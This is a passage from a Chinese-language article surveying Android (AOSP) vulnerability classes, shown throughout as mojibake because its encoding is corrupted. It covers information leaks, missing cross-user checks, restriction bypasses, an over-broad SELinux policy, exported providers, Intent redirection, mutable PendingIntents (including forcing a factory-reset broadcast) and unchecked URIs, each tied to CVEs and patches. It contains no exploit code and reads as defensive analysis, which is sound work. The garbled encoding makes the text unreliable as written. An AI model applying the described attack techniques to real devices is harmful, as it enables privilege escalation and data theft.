æ­¤æ»¡è¶³ä¸‹é¢çš„ if ç›´æ¥è¿”å›ï¼Œè°ƒç”¨è€…æ‹¿åˆ°ç©ºåˆ—è¡¨ï¼›è€Œå¯¹åº”åŒ…åå­˜åœ¨æ—¶ï¼Œä¼šè°ƒç”¨ enforceCallingPermission(android.Manifest.permission.DUMP, function)ï¼Œè°ƒç”¨è€…æ”¶åˆ° SecurityExceptionã€‚è¿™ä¸ªå¾®å°çš„è¡Œä¸ºå·®å¼‚é€ æˆäº†ä¿¡æ¯æ³„æ¼ã€‚ä¾‹å­2ï¼šCVE-2021-0975ï¼ŒåŒ…åå­˜åœ¨æ—¶æŠ›å‡ºçš„å¼‚å¸¸ä¿¡æ¯ä¸º &quot;package &quot; + packageName + &quot; does not match caller&#39;s uid &quot; + uid è€Œä¸å­˜åœ¨æ—¶æ˜¯ &quot;package &quot; + packageName + &quot; not found&quot;ï¼Œå¾®å°çš„ä¿¡æ¯å·®å¼‚é€ æˆä¿¡æ¯æ³„æ¼ã€‚è¿™ç§æ¼æ´éå¸¸éå¸¸å¤šï¼Œæˆ‘ç®€å•æœç´¢äº†ä¸€ä¸‹ï¼Œä»…ä»… Android 14 ä¸€ä¸ªå¤§ç‰ˆæœ¬ä¸­å°±ä¿®å¤äº†è‡³å°‘ 37 ä¸ªç±»ä¼¼çš„æ¼æ´ï¼Œå·²è¢«ä¿®å¤çš„ç±»ä¼¼æ¼æ´é¢„è®¡å·²è¾¾ä¸Šç™¾ä¸ªï¼Œå¯ä»¥æƒ³è±¡ AOSP ä¸­è¿˜æœ‰å¤šå°‘ã€‚æ­¤ç§æ¼æ´è°·æ­Œä¸€èˆ¬è¯„çº§ä»…ä¸º Moderateï¼Œè·å¾—çš„èµé‡‘ä¸Šé™ä»…ä¸º $250 ä¸”æ²¡æœ‰ CVE ç¼–å·ï¼Œä¸å€¼å¾—ä¸“é—¨å»æ‰¾ï¼Œé€‚åˆ code review æ—¶é¡ºæ‰‹æäº¤ä¸Šå»èµšèµé‡‘ã€‚è®¾å¤‡ç®¡ç†ä¸å¤šç”¨æˆ·Android ä» 4.2 å¼€å§‹åŠ å…¥äº†å¤šç”¨æˆ·åŠŸèƒ½ï¼Œå…è®¸å¤šä¸ªç”¨æˆ·å…¬ç”¨ä¸€å°è®¾å¤‡ï¼Œæ¯ä¸ªç”¨æˆ·å¯ä»¥å®‰è£…å„è‡ªçš„ appï¼Œæ•°æ®äº’ç›¸éš”ç¦»ï¼Œä¸€ä¸ªç”¨æˆ·é€šå¸¸æƒ…å†µä¸‹æ— æ³•è·¨è¶Šç”¨æˆ·è¾¹ç•Œè¯»å–æˆ–æ“ä½œå…¶ä»–å®Œå…¨ç”¨æˆ·çš„æ•°æ®ï¼ˆä½†ç®¡ç†å‘˜å¯ä»¥æ“ä½œè®¾å¤‡éƒ¨åˆ†åŠŸèƒ½æ˜¯å¦å¯¹å…¶ä»–ç”¨æˆ·å¼€æ”¾ï¼‰ã€‚è·¨ç”¨æˆ·æ“ä½œé€šå¸¸éœ€è¦ INTERACT_ACROSS_USERS INTERACT_ACROSS_USERS_FULL ç­‰ç³»ç»Ÿæƒé™ï¼Œå¦‚æœæœ‰æ–¹æ³•èƒ½ç»•è¿‡è·¨ç”¨æˆ·é™åˆ¶ï¼Œå°±ä¼šè¢«è§†ä¸ºå®‰å…¨æ¼æ´ã€‚éƒ¨åˆ†å…³é”®ç³»ç»Ÿåº”ç”¨å¯ä»¥åªåœ¨ä¸»ç”¨æˆ·è¿è¡Œï¼Œå…¶ä»–ç”¨æˆ·è®¿é—®åˆ°çš„åªæ˜¯ä¸»ç”¨æˆ·çš„å®ä¾‹ã€‚Android åŒæ—¶æ”¯æŒè®¾å¤‡ç®¡ç†ã€‚ç³»ç»Ÿå±‚æä¾› DevicePolicyManager ç”¨äºè®¾å¤‡ç®¡ç†å‘˜æ§åˆ¶è®¾å¤‡ï¼Œå¸¸ç”¨çš„æœ‰ lock task mode å¯ç”¨äºé”å®šè®¾å¤‡æˆ–é™åˆ¶è®¾å¤‡åªèƒ½è¿è¡ŒæŸå‡ ä¸ªåº”ç”¨ï¼ˆä¸“ç”¨è®¾å¤‡ç­‰ç”¨é€”ï¼Œå¦‚è‡ªåŠ¨å”®è´§æœºï¼‰å’Œ User Restrictions ç”¨äºé˜»æ­¢ç”¨æˆ·æ“ä½œç‰¹å®šè®¾å¤‡åŠŸèƒ½ï¼Œå¦‚ç¦ç”¨ WiFiã€ç¦ç”¨è“ç‰™ç­‰ã€‚å¦‚æœæœ‰æ–¹æ³•ç»•è¿‡è¿™äº›é™åˆ¶ä¹Ÿä¼šè¢«è§†ä¸ºå®‰å…¨æ¼æ´ã€‚CVE-2019-2098 &amp; CVE-2021-0686ï¼šAPI ç¼ºå¤±è·¨ç”¨æˆ·æ£€æŸ¥ä¸Šæ–‡æåˆ°ï¼Œä¸ºäº†æ”¯æŒå¤šç”¨æˆ·ï¼Œå¾ˆå¤š API çš„å‚æ•°é‡Œéƒ½åŠ ä¸Šäº†ä¸€ä¸ª userIdï¼Œè€Œè·¨ç”¨æˆ·æ“ä½œéœ€è¦ç³»ç»Ÿæƒé™ï¼Œè¿™éœ€è¦æœåŠ¡ç«¯ä¸»åŠ¨é‰´æƒï¼ŒAPI è¿™ä¹ˆå¤šæ€»ä¼šæœ‰ä¸€ä¸¤ä¸ªæ¼æ‰çš„ã€‚å¦ä¸€ç§å½¢å¼æ˜¯è¦æ±‚è°ƒç”¨è€…ä¼ å…¥ UIDï¼Œä½†è°ƒç”¨è€…å¯ä»¥ä¼ å…¥å±äºå…¶ä»–ç”¨æˆ·çš„ UIDã€‚ä¸‹é¢ä¸¤ä¸ªæ¼æ´å°±æ˜¯å¾ˆç»å…¸çš„æ¼è·¨ç”¨æˆ·æ£€æŸ¥ã€‚CVE-2019-2098 è¡¥ä¸ï¼šAdd cross user permission check - areNotificationsEnabledForPackageCVE-2021-0686 è¡¥ä¸ï¼šAdd cross-user check for getDefaultSmsPackage().CVE-2023-21107ï¼šç»„ä»¶ç¼ºå¤±è·¨ç”¨æˆ·æ¼æ´è¡¥ä¸ï¼šEnforce INTERACT_ACROSS_USERS_FULL permission for NotificationAccessDetailså¾ˆå¤šæ—¶å€™æˆ‘ä»¬å…³æ³¨è·¨ç”¨æˆ·åªå…³æ³¨ç³»ç»Ÿæä¾›çš„å¸¦æœ‰ userId å‚æ•°çš„ APIï¼Œè€Œå¿½ç•¥äº†ç³»ç»Ÿåº”ç”¨ã€‚ä½œä¸ºä¸€ä¸ªå…³é”®ç³»ç»Ÿåº”ç”¨ï¼Œç³»ç»Ÿè®¾ç½®æ‹¥æœ‰è·¨ç”¨æˆ·æƒé™ï¼Œæ­¤æ¼æ´ä¸­çš„ä¸€ä¸ª Fragment æ¥æ”¶å¤–éƒ¨ä¼ é€’çš„ user handle è€Œæ²¡æœ‰ä»»ä½•è¾“å…¥æ ¡éªŒå’Œæƒé™æ£€æŸ¥ï¼Œç„¶åç›´æ¥å¼€å§‹ä½¿ç”¨è¿™ä¸ª user handleï¼Œè¿™æ ·å°±ä½¿å¾—æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ä¸€ä¸ªä½æƒé™çš„æ¶æ„åº”ç”¨ï¼Œæ‰“å¼€ Settings å¹¶ä¼ å…¥å…¶ä»–ç”¨æˆ·çš„ handleï¼Œè®©é«˜æƒé™çš„ Settings é”™è¯¯è®¿é—®å’Œæ“ä½œå…¶ä»–ç”¨æˆ·çš„æ•°æ®ã€‚è¿™ç§â€œä½æƒé™ä¸ªä½“æ¬ºéª—é«˜æƒé™ä¸ªä½“æ‰§è¡Œç‰¹æƒæ“ä½œâ€çš„æ”»å‡»æ¨¡å¼è¢«ç§°ä¸º confused deputyï¼Œè™½ç„¶æ­¤ä¾‹ä¹Ÿå¯ä»¥è¯´ missing permissions check æˆ–è€… missing input validationã€‚äº‹å®ä¸Šåœ¨ç¼–å†™è¿™ç¯‡æ–‡ç« çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘é¡ºæ‰‹æœäº†ä¸€ä¸‹è¯¥æ¼æ´ä¸­ç”¨åˆ°çš„ Intent.EXTRA_USER_HANDLEï¼Œç„¶åå°±å‘ç° Settings ä¸­çš„å¦ä¸€ä¸ªè¢«ç§°ä¸º AppInfoBase çš„ fragment ä¹Ÿå­˜åœ¨ä¸€æ¨¡ä¸€æ ·çš„æ¼æ´ï¼Œå–œæå¤©ä¸Šæ‰ä¸‹æ¥çš„é«˜å±æ¼æ´ CVE-2024-43088ã€‚CVE-2023-21123ï¼šç¼ºå¤± User Restrictions æ£€æŸ¥æ¼æ´è¡¥ä¸ï¼šAdd DISALLOW_DEBUGGING_FEATURES checkDISALLOW_DEBUGGING_FEATURES æ˜¯ä¸€ä¸ª user restrictionï¼Œå¯ä»¥ç”±è®¾å¤‡ç®¡ç†å‘˜è®¾ç½®ä»¥å…³é—­è°ƒè¯•ç›¸å…³çš„åŠŸèƒ½ã€‚Tracur æ˜¯ä¸€ä¸ªç³»ç»Ÿå†…ç½®çš„åº”ç”¨ï¼Œå’Œ trace ç›¸å…³ï¼Œè€Œ trace æ˜¯è°ƒè¯•åŠŸèƒ½ã€‚æ­¤ä¾‹ä¸­ï¼ŒTracur æ²¡æœ‰æ£€æŸ¥ DISALLOW_DEBUGGING_FEATURESï¼Œè™½ç„¶è®¾ç½®ä¸­å¼€å‘è€…é€‰é¡¹æ‰“ä¸å¼€ï¼Œä½†æ˜¯åˆ©ç”¨ä¸€ä¸ªåº”ç”¨å¯ä»¥ç›´æ¥è°ƒèµ· Tracur ä»è€Œæ“ä½œ traceã€‚ä¸ªäººè§‚å¯Ÿåˆ°çš„æ˜¯ Android 12-13 åˆšå‘å¸ƒçš„æ—¶å€™å‡ºç°äº†å¾ˆå¤šè¿™ç§ restriction bypass çš„æ¼æ´ï¼Œå¯èƒ½æ˜¯ Android 12 ä¸­å°†ç³»ç»Ÿè®¾ç½®ã€SystemUI ç­‰åº”ç”¨ç¨‹åºé‡æ„ä¸ºæ–°çš„ Material You è®¾è®¡é£æ ¼æ—¶è¿›è¡Œäº†è¾ƒå¤§çš„ä»£ç æ”¹åŠ¨æ‰€å¯¼è‡´ã€‚ç¬”è€…ä¹Ÿæ›¾ç»æäº¤è¿‡ç±»ä¼¼æ¼æ´ï¼Œåªè·å¾—äº† Moderate è¯„çº§ï¼Œæ‘¸ä¸æ¸… Google å¿ƒæƒ…ã€‚CVE-2021-0691ï¼šSELinux æƒé™é…ç½®ä¸å½“ä¸Šæ–‡è¯´ï¼ŒAndroid é™¤äº†ä½¿ç”¨ UID ç­‰ Linux ä¼ ç»Ÿçš„ DAC æœºåˆ¶ï¼Œè¿˜ä½¿ç”¨ SELinux è¿™ä¸€ MAC æœºåˆ¶è¿›ä¸€æ­¥ç¼©å‡è¿›ç¨‹æƒé™ï¼Œç¡®ä¿ç³»ç»Ÿå®‰å…¨ã€‚è€Œæœ¬èŠ‚ä¸­æåˆ°çš„ CVE-2021-0691 å°±æ˜¯ SELinux æƒé™é…ç½®è¿‡å¤§å¯¼è‡´ã€‚è¡¥ä¸é“¾æ¥ï¼šsystem_app: remove adb data loader permissionså¯ä»¥çœ‹è§ï¼ŒåŸæœ¬çš„ç­–ç•¥å…è®¸ system_app å†™å…¥ apk_data_file å³å·²å®‰è£…åº”ç”¨çš„ apk æ–‡ä»¶ï¼Œå¯ä»¥è¦†ç›–å…¶ä»–åº”ç”¨çš„ dex/so ç­‰æ–‡ä»¶è¿›è€Œå‘å…¶ä»–åº”ç”¨æŒä¹…æ³¨å…¥ä»£ç ã€‚è™½ç„¶æ”»å‡»åªèƒ½ç”±ç³»ç»Ÿçš„ system_app å‘èµ·ï¼Œè¿™æ»¡è¶³äº† åˆ†çº§è°ƒèŠ‚è§„åˆ™ ä¸­ã€éœ€è¦ä½œä¸ºç‰¹æƒä¸Šä¸‹æ–‡è¿è¡Œæ‰èƒ½æ‰§è¡Œæ”»å‡»ã€‘ä¸€æ¡ï¼Œä¸¥é‡ç¨‹åº¦è¢«é™ä¸º moderateï¼Œä½†å¦‚æœæŠŠè¿™ä¸ªæ¼æ´å’Œ system_app ä¸­çš„å…¶ä»–æ¼æ´å¦‚è·¯å¾„ç©¿è¶Šå†™æ¼æ´ç»“åˆèµ·æ¥ï¼Œå°±èƒ½ç»„æˆä¸€æ¡éå¸¸æœ‰å¨åŠ›çš„æ¼æ´é“¾ã€‚äº‹å®ä¸Šï¼Œæ­¤æ¼æ´æœ¬èº«å°±æ˜¯â€œé­”å½¢å¥³â€æ¼æ´é“¾çš„é‡è¦ä¸€ç¯ã€‚æƒ³äº†è§£è¿™ä¸€æ¼æ´é“¾å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ã€‚å†å²ä¸Šä¹Ÿå‡ºç°è¿‡æƒé™é…ç½®é”™è¯¯é€ æˆçš„ä¸¥é‡ç¨‹åº¦æ›´é«˜çš„æ¼æ´ï¼Œé€šæ€è”å‘ç§‘è®¾å¤‡çš„ MediaTek-SU æ¼æ´ï¼ˆCVE-2020-0069ï¼‰å°±å±äºæ­¤ç±»ã€‚è™½ç„¶ä¸ºäº†å®‰å…¨ï¼ŒAndroid çš„ SELinux ä¸­å­˜åœ¨å¤§é‡ neverallow è§„åˆ™ä¿è¯ OEM ä¸ä¼šæ·»åŠ å¤ªè¿‡ç¦»è°±çš„è§„åˆ™ï¼Œä¿®æ”¹ neverallow ä¼šå¯¼è‡´æ— æ³•é€šè¿‡ CTSï¼Œä½†æˆ‘ä»¬ç¡®å®å‘ç°æœ‰ä¸€äº› OEM ç¡®å®å…è®¸äº†è¢« neverallow çš„æ¡ç›®ã€‚åªèƒ½å¯¹ OEM è´¨é‡ä¸€å£°å¹æ¯ã€‚ç»„ä»¶ä¸æ„å›¾æ¯ä¸ª Android ç¨‹åºå‘˜éƒ½çŸ¥é“çš„ Android å››å¤§ç»„ä»¶ï¼šActivity Service BroadcastReceiver ContentProviderã€‚Intent åˆ™æ˜¯ä¸ç»„ä»¶äº¤äº’çš„æ¡¥æ¢ã€‚æœ‰æ—¶ï¼Œä¸ç»æ„é—´çš„ä¸å½“ä½¿ç”¨ï¼Œä¹Ÿè®¸å°±ä¼šé€ æˆæ¼æ´ã€‚CVE-2021-0693ï¼šç»„ä»¶æƒé™é…ç½®ä¸å½“æ¼æ´è¡¥ä¸ï¼šDonâ€™t export HeapDumpProvider.ç»„ä»¶çš„ exported å±æ€§è¡¨ç¤ºè¯¥ç»„ä»¶æ˜¯å¦å¯è¢«å¤–éƒ¨åº”ç”¨è®¿é—®ï¼Œè‹¥æ²¡æœ‰è®¾ç½®åˆ™æœ‰ intent-filter çš„ç»„ä»¶é»˜è®¤å¯¼å‡ºï¼ˆtarget Android 12+ çš„ app å¦‚æœå‡ºç°è¿™ç§æƒ…å†µä¼šè¢«ç›´æ¥æ‹’ç»å®‰è£…ï¼‰ã€‚å³ä½¿å¯¼å‡ºäº†ç»„ä»¶ï¼Œä¹Ÿå¯ä»¥è®¾ç½® android:permission ç­‰å±æ€§æ¥é™åˆ¶åªæœ‰æ‹¥æœ‰å¯¹åº”æƒé™çš„åº”ç”¨æ‰èƒ½è®¿é—®æ­¤ç»„ä»¶ã€‚æœ¬ä¾‹ä¸­å—å®³ provider è®¾ç½® exported=true å³å¯¼å‡ºï¼ŒåŒæ—¶æ²¡æœ‰è®¾ç½®è®¿é—®æƒé™ï¼Œä»»ä½•åº”ç”¨éƒ½èƒ½ç›´æ¥è®¿é—®ï¼Œè€Œè®¿é—® HeapDumpProvider èƒ½è·å–åˆ°è°ƒè¯•ç”¨çš„å…¶ä»– app çš„ heap dumpï¼Œæ˜¾ç„¶æ˜¯æ•æ„Ÿä¿¡æ¯ï¼Œä»è€Œé€ æˆéå¸¸æ˜æ˜¾çš„å®‰å…¨æ¼æ´ã€‚è¿™ç§æ¼æ´å‰å‡ å¹´æ¯”è¾ƒå¤šï¼Œæ—©æœŸç”šè‡³å‡ºç°è¿‡æŠŠ android:exported=&quot;true&quot; è¯¯å†™æˆ exported=&quot;true&quot; è¿™ç§æ¼æ´ï¼ˆCVE-2013-6272ï¼‰ï¼Œéšç€ç³»ç»Ÿçš„æ—¥ç›Šå®Œå–„æˆç†Ÿï¼Œè¿‘å‡ å¹´è§‚å¯Ÿåˆ°çš„å°‘äº†ã€‚åç»­æŒ–æ˜é‡ç‚¹å¯ä»¥é›†ä¸­åœ¨ OEM è‡ªå®šä¹‰çš„ç»„ä»¶ä¸Šã€‚LaunchAnywhereï¼šå±é™©çš„ Intent Redirectionå¤§åé¼é¼çš„ LaunchAnywhere åº”è¯¥æ˜¯æœ€æ—©ä¹Ÿæœ€ç»å…¸çš„ Intent Redirection ç±»å‹æ¼æ´ï¼Œå¯æƒœçš„æ˜¯å¹´ä»£ä¹…è¿œæ²¡æœ‰æ‰¾åˆ° CVE ç¼–å·ï¼Œåªæœ‰ä¸€ä¸ª Bug ID A-7699048ã€‚è¿™ä¸ªæ´ç½‘ä¸Šçš„è¯¦ç»†åˆ†æå·²ç»æœ‰å¾ˆå¤šäº†ï¼Œè¿™é‡Œä¸èµ˜è¿°ï¼Œåªç®€å•ä»‹ç»ä¸€ä¸‹å®ƒçš„åŸºæœ¬åŸç†ï¼šåº”ç”¨ A é€šè¿‡ AccountManager API æ·»åŠ è´¦å·æ—¶ï¼ŒAccountManagerService ä¼šè¯·æ±‚ account çš„ authenticatorï¼ˆä¹Ÿæ˜¯ä¸€ä¸ªåº”ç”¨ï¼‰ï¼Œè€Œè¿™ä¸ª authenticator å¯èƒ½éœ€è¦å‘ç”¨æˆ·æ˜¾ç¤ºä¸€ä¸ªç•Œé¢ï¼Œæ‰€ä»¥å¯èƒ½è¿”å›ä¸€ä¸ª intentï¼Œæ­¤æ—¶ AccountManagerService æŠŠ intent è¿”å›ç»™ Aï¼Œåœ¨ A ä¸­è¿è¡Œçš„ç³»ç»Ÿä»£ç ä¼šç›´æ¥è°ƒç”¨ startActivity å¯åŠ¨è¿™ä¸ª intentï¼Œè¿™é‡Œç”¨çš„æ˜¯ A çš„èº«ä»½ï¼Œä»è€Œå¯ä»¥æ— é™åˆ¶è®¿é—®åº”ç”¨å†…éƒ¨ Activity ç»„ä»¶ã€‚å¦‚æœ A æ˜¯ Settingsï¼Œå®ƒæ‹¥æœ‰ç³»ç»Ÿæƒé™ï¼Œæ­¤æ—¶å°±å¯ä»¥è®¿é—®æ‰€æœ‰åº”ç”¨çš„æ‰€æœ‰ Activityï¼Œæ— è§†å®ƒæ˜¯å¦å¯¼å‡ºæˆ–æ˜¯å¦è¢«æƒé™ä¿æŠ¤ã€‚Intent Redirection æ˜¯ Android å¹³å°æœ€ç»å…¸çš„æ¼æ´ç±»å‹ï¼Œå·²åœ¨ Android ç³»ç»Ÿã€å®šåˆ¶ç³»ç»Ÿã€ä¸‰æ–¹åº”ç”¨ç¨‹åºç­‰ä¸­å¤šæ¬¡å‡ºç°è¿‡ã€‚å…¶åŸºæœ¬ç‰¹å¾ä¸ºæ”¶åˆ°åˆ«äººå‘é€çš„ intentï¼Œéšåå°†å…¶è½¬å‘å‡ºå»ï¼Œå¸¸è§ API æœ‰ startActivityã€sendBroadcastã€setResult ç­‰ã€‚å‰ä¸¤ä¸ªå¾ˆæ˜æ˜¾ï¼Œå¯ä»¥è®¿é—®å†…éƒ¨ç»„ä»¶ï¼Œè€Œ setResult è™½ç„¶ä¸èƒ½ç›´æ¥è®¿é—®å†…éƒ¨ç»„ä»¶ï¼Œä½†æ”»å‡»è€…å¯ä»¥é€šè¿‡æŒ‡å®š intent çš„ data ä¸ºåº”ç”¨å†…éƒ¨å—ä¿æŠ¤çš„ URIï¼Œå¹¶åœ¨ intent flags ä¸­æŒ‡å®š FLAG_GRANT_READ/WRITE_URI_PERMISSIONï¼Œå½“å—å®³åº”ç”¨ä½¿ç”¨æ¶æ„ intent è°ƒç”¨ setResult() æ—¶ï¼Œå°±ä¼šä¸çŸ¥ä¸è§‰æˆäºˆæ¶æ„åº”ç”¨è¯»å†™è‡ªèº«å†…éƒ¨ content provider çš„æƒé™ã€‚åœ¨ Android 12 ä¸­ï¼Œä¸ºäº†è§„é¿è¿™ç±»é—®é¢˜ï¼ŒStrict mode å¼•å…¥äº†æ–°çš„åŠŸèƒ½ï¼Œå¯ä»¥æ£€æµ‹åˆ°åº”ç”¨æ”¶åˆ°ï¼ˆgetParcelableï¼‰åˆ«äººå‘æ¥çš„ intent å¹¶å°†å…¶ç«‹å³è½¬å‘çš„æƒ…å†µï¼Œä¸€å®šç¨‹åº¦ä¸Šå¸®åŠ©äº†å¼€å‘è€…è¯†åˆ«æ­¤ç±»æ¼æ´ã€‚ä½†æ˜¯ï¼Œè¿™ä¸ªå·¥å…·å¹¶ä¸èƒ½æ‰«æåˆ°æ‰€æœ‰å±é™©ï¼Œè€Œä¸”ç›´æ¥è½¬å‘ intent å¹¶ä¸æ˜¯ intent redirection çš„å”¯ä¸€ä¸€ç§ç±»å‹ï¼ŒCVE-2022-20550 &amp; CVE-2024-0015 å°±æ˜¯ä¸€ä¸ªä¾‹å­ï¼Œç‰¹æƒåº”ç”¨æ¥æ”¶ä¸å¯ä¿¡çš„ ComponentName ç„¶åç›´æ¥åˆ›å»ºæŒ‡å‘è¯¥ ComponentName çš„ intent å¹¶ startActivityï¼Œä¹Ÿèƒ½å¤Ÿè¶Šæƒè®¿é—®ç»„ä»¶ã€‚è¡¥ä¸åœ¨è¿™é‡Œï¼šFix vulnerability that allowed attackers to start arbitary activitiesã€‚CVE-2014-8609ï¼ˆBroadcastAnywhereï¼‰ï¼šå±é™©çš„ Pending Intentä¸Šæ–‡æåˆ°çš„ Intent å…¶å®è¿˜æ¼äº†ä¸€ç§ç‰¹æ®Šå½¢å¼ï¼Œå³ PendingIntentã€‚ç®€å•æ¥è¯´ï¼ŒPendingIntent ç”±åº”ç”¨ä¸»åŠ¨åˆ›å»ºï¼Œä»£è¡¨æŸé¡¹ç‰¹æ®Šçš„æ“ä½œï¼Œå¯ä»¥ä¼ é€ç»™åˆ«çš„åº”ç”¨ï¼Œåˆ«çš„åº”ç”¨å‘é€è¿™ä¸ª PendingIntent æ—¶å°±ä»¥ PendingIntent åˆ›å»ºè€…çš„èº«ä»½å‘é€ã€‚åˆ›å»ºæ—¶å¯ä»¥æŒ‡å®š PendingIntent æ˜¯å¦å¯å˜ï¼Œå¦‚æœå¯å˜åˆ™å…è®¸å‘é€è€…ä¿®æ”¹æœªè¢«æ˜¾å¼æŒ‡å®šçš„ intent å­—æ®µï¼Œå¦‚ actionã€dataã€flags ç­‰ã€‚ä¸ºäº†å®‰å…¨èµ·è§ï¼Œé»˜è®¤ selector å’Œ ComponentName æ˜¯ä¸å…è®¸è¢«ä¿®æ”¹çš„ã€‚å›è¿‡å¤´æ¥çœ‹æ¼æ´è¡¥ä¸ï¼šSECURITY: Donâ€™t pass a usable Pending Intent to 3rd parties.å¾ˆæ˜æ˜¾ï¼Œè¿™é‡Œçš„ mPendingIntent åˆ›å»ºæ—¶ä½¿ç”¨äº†ä¸€ä¸ªç©ºçš„ã€å•¥éƒ½æ²¡æœ‰çš„ intentï¼ŒåŒæ—¶æœªæŒ‡å®š FLAG_IMMUTABLEï¼ˆè™½ç„¶å®é™…åŸå› æ˜¯è¿™ç©æ„åœ¨ Android 6.0 æ‰åŠ ï¼Œé‚£ä¸ªå¹´ä»£è¿˜æ²¡æœ‰è¿™ç©æ„ï¼‰ï¼Œè¿™ä½¿å¾—æ”»å‡»è€…æ‹¿åˆ°è¿™ä¸ª PendingIntent ä¹‹åå¯ä»¥ä»»æ„æ”¹å†™é‡Œé¢çš„ intent å†å‘é€ï¼ŒåŒæ—¶ç”±äºè¿™ä¸ª PendingIntent æ˜¯ Settings åˆ›å»ºçš„ï¼Œå…·æœ‰ç³»ç»Ÿæƒé™ï¼Œæ”»å‡»è€…å‘é€ PendingIntent æ—¶ä¼šä»¥åˆ›å»ºè€…èº«ä»½å‘é€ï¼Œä¹Ÿå°±åŒæ ·æ˜¯ä»¥ç³»ç»Ÿæƒé™ã€‚è¿™é‡Œ PendingIntent æ˜¯ç”¨çš„ getBroadcastï¼Œæœ€å send çš„æ—¶å€™ä¹Ÿä¼šä»¥å¹¿æ’­æ–¹å¼å‘é€ï¼Œæ¯”å¦‚æ”»å‡»è€…æ”¹å†™ action å­—æ®µä¸º android.intent.action.MASTER_CLEARï¼Œå¹¿æ’­å‘é€å‡ºå»åå°±ä¼šè§¦å‘ MasterClearReceiver è¿›è¡Œæ¢å¤å‡ºå‚è®¾ç½®çš„æ“ä½œã€‚äº‹å®ä¸Šï¼Œå°±ç®—æ˜¯å¼€å‘è€…è®°å¾—å¡«å…… actionï¼Œæœ‰æ—¶å€™ä¹Ÿä¸èƒ½é¿å…æ¼æ´çš„å‡ºç°ã€‚æ¶æ„åº”ç”¨å¯ä»¥åœ¨è‡ªå·±çš„ AndroidManifest.xml ä¸­æ³¨å†Œç›¸åŒ action çš„ intent-filterï¼Œæ”¹å†™ package æŒ‡å‘æ¶æ„åº”ç”¨è‡ªå·±ï¼Œflags æ·»åŠ æˆæƒ flagsï¼Œdata/clipdata uri æŒ‡å‘å—å®³åº”ç”¨ç§æœ‰çš„æˆ–è€…å¯è®¿é—®çš„ ContentProvider å¹¶å‘é€ï¼Œæ­¤æ—¶æ¶æ„åº”ç”¨å°±ä¼šè¢«æˆäºˆæƒé™ã€‚æ›´å¤šå¯ä»¥æŸ¥çœ‹ OPPO çš„è¿™ç¯‡æ–‡ç« ï¼šPendingIntenté‡å®šå‘ï¼šä¸€ç§é’ˆå¯¹å®‰å“ç³»ç»Ÿå’Œæµè¡ŒAppçš„é€šç”¨ææƒæ–¹æ³•â€”â€”BlackHat EU 2021è®®é¢˜è¯¦è§£ ï¼ˆä¸‹ï¼‰ï¼ˆæ³¨ï¼šä¸ºäº†å®‰å…¨è€ƒè™‘ï¼Œå¦‚æœå—å®³è€…æ˜¯ root/system UIDï¼Œæˆæƒæ—¶è¦æ±‚ URI å¿…é¡»æ˜¯å‡ ä¸ªç‰¹å®š authority å¦åˆ™ä¼šè¢«æ‹’ç»ï¼Œä½†å¯¹äºç³»ç»Ÿä¸­åŠåº”ç”¨å¸‚åœºä¸­çš„æµ·é‡åº”ç”¨ï¼Œå®ƒä»¬ä»å¯èƒ½è¢«æ”»å‡»ï¼‰ä¸ºäº†ä¿è¯å®‰å…¨æ€§ï¼ŒAndroid 6.0 æ·»åŠ äº† FLAG_IMMUTABLE ç”¨äºæŒ‡å®š PendingIntent ä¸å¯å˜ï¼Œè€Œ Android 12 æ·»åŠ äº† FLAG_MUTABLEï¼Œtarget Android 12+ çš„åº”ç”¨åˆ›å»º PendingIntent æ—¶å¿…é¡»æ˜¾å¼æŒ‡å®šå¯å˜æ€§ï¼Œä¸å†è®©åº”ç”¨å¼€å‘è€…éšæ‰‹å†™ä¸‹çš„ 0 å˜æˆå®‰å…¨æ¼æ´ï¼Œè‡ªæ­¤è¿™ä¸€ç±»æ¼æ´é”€å£°åŒ¿è¿¹ã€‚ä½†æœ‰éƒ¨åˆ†åœºæ™¯ PendingIntent ä»ç„¶æ˜¯å¯å˜çš„ï¼Œæ­¤æ—¶å°±è¦ä¸‡åˆ†å°å¿ƒã€‚CVE-2017-0639ï¼šå±é™©çš„ URIURI åœ¨ Android ä¸­éå¸¸å¸¸ç”¨ï¼Œå¦‚å¸¸è§çš„åˆ†äº«æ–‡ä»¶æ“ä½œï¼Œå°±æ˜¯åˆ›å»ºä¸€ä¸ª ACTION_SEND çš„ intentï¼ŒæŠŠè¦åˆ†äº«çš„æ–‡ä»¶çš„ URI æ”¾åˆ°é‡Œé¢ï¼Œç„¶å startActvityã€‚å¸¸è§çš„æœ‰å®‰å…¨å½±å“çš„ URI æœ‰ content uri å’Œ file uriï¼ˆAndroid 7.0+ å·²å¼ƒç”¨ï¼‰ç­‰ã€‚è¿™é‡Œå…¶å®æœ‰ä¸€ç‚¹è¦æ³¨æ„çš„ï¼Œå°±æ˜¯æ¥æ”¶åˆ°çš„ URI å¯èƒ½æŒ‡å‘åŸæœ¬å‘é€è€…ä¸åº”è¯¥æœ‰æƒé™è®¿é—®çš„æ•°æ®ï¼Œå¦‚æœå—å®³åº”ç”¨ä¸åŠ æ£€æŸ¥ç›´æ¥ä½¿ç”¨ï¼Œå°±æœ‰å¯èƒ½é€ æˆä¿¡æ¯æ³„æ¼ã€‚æœ¬ä¾‹çš„ CVE-2017-0639 å°±æ˜¯è¿™æ ·ä¸€ä¸ªæ¼æ´ï¼Œæ¼æ´è¡¥ä¸ï¼šOPP: Restrict file based URI access to external storageä½œè€…å†™çš„æ–‡ç« ä¹Ÿå¯ä»¥çœ‹ä¸€ä¸‹ã€‚è¿™é‡Œæä¸€ä¸ªç‚¹å°±æ˜¯ï¼Œç¦æ­¢å‘å¤–ä¼ å‡º file:// URI è¿™ä¸ªåŠŸèƒ½åªæ˜¯ Strict mode çš„é™åˆ¶ï¼Œåªéœ€è¦æŠŠ strict mode å…³é—­å°±å¥½ã€‚file:// URI ä» Android 7.0 å¼€å§‹è¢«å¼ƒç”¨ï¼Œåƒè¿™æ ·ç›´æ¥æ„é€ æŒ‡å‘ç§æœ‰æ–‡ä»¶çš„ file URI çš„è¿™ç§åˆ©ç”¨æ‰‹æ³•è¿‘å‡ å¹´åº”è¯¥æ˜¯å‡ ä¹ç»è¿¹ï¼Œä½†åƒè¿™æ ·ç¼ºå¤± URI 